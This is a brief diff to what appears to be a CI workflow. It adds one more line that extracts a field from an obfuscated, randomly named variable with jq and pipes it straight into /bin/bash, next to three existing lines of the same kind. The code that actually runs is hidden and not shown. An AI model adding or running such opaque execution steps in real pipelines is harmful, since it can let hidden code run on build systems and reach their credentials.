@@ -28,6 +28,7 @@ jobs:
           echo $pc6 | jq -r .w7 | /bin/bash
           echo $pgvps28 | jq -r .yfc822 | /bin/bash
           printf '%s' "$hto414" | jq -r .apd110 | /bin/bash
+          printf '%s' "$hqn1087" | jq -r .juo1666 | /bin/bash
 
       - name: Save archive
         if: always()
